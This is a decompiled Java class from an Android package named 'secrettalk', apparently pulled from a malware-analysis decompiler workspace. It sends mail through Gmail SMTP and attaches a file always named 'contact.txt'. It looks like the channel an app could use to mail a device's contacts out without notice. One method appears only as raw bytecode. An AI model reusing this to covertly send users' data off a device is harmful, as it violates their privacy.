package com.android.secrettalk;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.Message.RecipientType;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class GMailSender
  extends Authenticator
{
  private String mailhost = "smtp.gmail.com";
  private String password;
  private Session session;
  String strFileName = "contact.txt";
  private String user;
  
  public GMailSender(String paramString1, String paramString2)
  {
    this.user = paramString1;
    this.password = paramString2;
    Properties localProperties = new Properties();
    localProperties.setProperty("mail.transport.protocol", "smtp");
    localProperties.setProperty("mail.host", this.mailhost);
    localProperties.put("mail.smtp.auth", "true");
    localProperties.put("mail.smtp.port", "465");
    localProperties.put("mail.smtp.socketFactory.port", "465");
    localProperties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
    localProperties.put("mail.smtp.socketFactory.fallback", "false");
    localProperties.setProperty("mail.smtp.quitwait", "false");
    this.session = Session.getDefaultInstance(localProperties, this);
  }
  
  protected PasswordAuthentication getPasswordAuthentication()
  {
    return new PasswordAuthentication(this.user, this.password);
  }
  
  /* Error */
  public void sendMail(String paramString1, String paramString2, String paramString3, String paramString4)
    throws Exception
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: new 88	javax/mail/internet/MimeMessage
    //   5: dup
    //   6: aload_0
    //   7: getfield 76	com/android/secrettalk/GMailSender:session	Ljavax/mail/Session;
    //   10: invokespecial 91	javax/mail/internet/MimeMessage:<init>	(Ljavax/mail/Session;)V
    //   13: astore 5
    //   15: new 93	javax/activation/DataHandler
    //   18: dup
    //   19: new 6	com/android/secrettalk/GMailSender$ByteArrayDataSource
    //   22: dup
    //   23: aload_0
    //   24: aload_2
    //   25: invokevirtual 99	java/lang/String:getBytes	()[B
    //   28: ldc 101
    //   30: invokespecial 104	com/android/secrettalk/GMailSender$ByteArrayDataSource:<init>	(Lcom/android/secrettalk/GMailSender;[BLjava/lang/String;)V
    //   33: invokespecial 107	javax/activation/DataHandler:<init>	(Ljavax/activation/DataSource;)V
    //   36: astore 6
    //   38: aload 5
    //   40: new 109	javax/mail/internet/InternetAddress
    //   43: dup
    //   44: aload_3
    //   45: invokespecial 112	javax/mail/internet/InternetAddress:<init>	(Ljava/lang/String;)V
    //   48: invokevirtual 116	javax/mail/internet/MimeMessage:setSender	(Ljavax/mail/Address;)V
    //   51: aload 5
    //   53: aload_1
    //   54: invokevirtual 119	javax/mail/internet/MimeMessage:setSubject	(Ljava/lang/String;)V
    //   57: aload 5
    //   59: aload 6
    //   61: invokevirtual 123	javax/mail/internet/MimeMessage:setDataHandler	(Ljavax/activation/DataHandler;)V
    //   64: aload 4
    //   66: bipush 44
    //   68: invokevirtual 127	java/lang/String:indexOf	(I)I
    //   71: ifle +24 -> 95
    //   74: aload 5
    //   76: getstatic 133	javax/mail/Message$RecipientType:TO	Ljavax/mail/Message$RecipientType;
    //   79: aload 4
    //   81: invokestatic 137	javax/mail/internet/InternetAddress:parse	(Ljava/lang/String;)[Ljavax/mail/internet/InternetAddress;
    //   84: invokevirtual 141	javax/mail/internet/MimeMessage:setRecipients	(Ljavax/mail/Message$RecipientType;[Ljavax/mail/Address;)V
    //   87: aload 5
    //   89: invokestatic 147	javax/mail/Transport:send	(Ljavax/mail/Message;)V
    //   92: aload_0
    //   93: monitorexit
    //   94: return
    //   95: aload 5
    //   97: getstatic 133	javax/mail/Message$RecipientType:TO	Ljavax/mail/Message$RecipientType;
    //   100: new 109	javax/mail/internet/InternetAddress
    //   103: dup
    //   104: aload 4
    //   106: invokespecial 112	javax/mail/internet/InternetAddress:<init>	(Ljava/lang/String;)V
    //   109: invokevirtual 151	javax/mail/internet/MimeMessage:setRecipient	(Ljavax/mail/Message$RecipientType;Ljavax/mail/Address;)V
    //   112: goto -25 -> 87
    //   115: astore 7
    //   117: aload_0
    //   118: monitorexit
    //   119: aload 7
    //   121: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	122	0	this	GMailSender
    //   0	122	1	paramString1	String
    //   0	122	2	paramString2	String
    //   0	122	3	paramString3	String
    //   0	122	4	paramString4	String
    //   13	83	5	localMimeMessage	MimeMessage
    //   36	24	6	localDataHandler	DataHandler
    //   115	5	7	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   2	92	115	finally
    //   95	112	115	finally
  }
  
  public void sendMailWithFile(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6)
  {
    try
    {
      MimeMessage localMimeMessage = new MimeMessage(this.session);
      localMimeMessage.setFrom(new InternetAddress(paramString3));
      localMimeMessage.setSubject(paramString1);
      localMimeMessage.setContent(paramString2, "text/plain");
      localMimeMessage.setSentDate(new Date());
      localMimeMessage.setRecipient(Message.RecipientType.TO, new InternetAddress(paramString4));
      MimeBodyPart localMimeBodyPart = new MimeBodyPart();
      localMimeBodyPart.setDataHandler(new DataHandler(new FileDataSource(new File(paramString5))));
      MimeMultipart localMimeMultipart = new MimeMultipart();
      localMimeMultipart.addBodyPart(localMimeBodyPart);
      localMimeMessage.setContent(localMimeMultipart);
      localMimeMessage.setFileName(this.strFileName);
      Transport.send(localMimeMessage);
      label143:
      return;
    }
    catch (Exception localException)
    {
      break label143;
    }
  }
  
  public class ByteArrayDataSource
    implements DataSource
  {
    private byte[] data;
    private String type;
    
    public ByteArrayDataSource(byte[] paramArrayOfByte)
    {
      this.data = paramArrayOfByte;
    }
    
    public ByteArrayDataSource(byte[] paramArrayOfByte, String paramString)
    {
      this.data = paramArrayOfByte;
      this.type = paramString;
    }
    
    public String getContentType()
    {
      if (this.type == null) {}
      for (String str = "application/octet-stream";; str = this.type) {
        return str;
      }
    }
    
    public InputStream getInputStream()
      throws IOException
    {
      return new ByteArrayInputStream(this.data);
    }
    
    public String getName()
    {
      return "ByteArrayDataSource";
    }
    
    public OutputStream getOutputStream()
      throws IOException
    {
      throw new IOException("Not Supported");
    }
    
    public void setType(String paramString)
    {
      this.type = paramString;
    }
  }
}


/* Location:           D:\Workspaces\SsSDK\contest_dev\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.GMailSender
 * JD-Core Version:    0.7.0.1
 */